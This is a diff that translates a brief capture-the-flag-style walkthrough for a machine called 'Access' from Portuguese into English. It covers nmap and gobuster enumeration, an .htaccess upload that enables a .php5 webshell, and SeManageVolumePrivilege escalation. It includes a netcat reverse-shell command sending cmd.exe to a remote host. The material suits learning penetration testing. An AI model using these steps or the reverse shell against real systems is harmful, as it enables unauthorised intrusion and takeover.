@@ -1,7 +1,7 @@
 # Access
 > .htaccess upload + SeManageVolume
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,32 +11,32 @@ nmap -sC -sV -oN nmap.txt <IP>
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 ```
 
-## Exploração
+## Exploitation
 
-Upload de arquivo `.htaccess` para habilitar execução de PHP:
+Upload `.htaccess` file to enable PHP execution:
 
 ```
 echo 'AddType application/x-httpd-php .php5' > .htaccess
 ```
 
-Upload de webshell `.php5` e execução de comandos.
+Upload `.php5` webshell and execute commands.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
 ```
 whoami /priv
 ```
 
-Privilégio `SeManageVolumePrivilege` habilitado.
+`SeManageVolumePrivilege` privilege enabled.
 
 ```
 SeManageVolume.exe
 ```
 
-Acesso de leitura/escrita ao volume → substitui binário privilegiado.
+Read/write access to the volume — replace privileged binary.
 
 ```
 nc.exe <IP> <PORTA> -e cmd.exe
 ```
 
-Root/SYSTEM obtido.
+SYSTEM obtained.
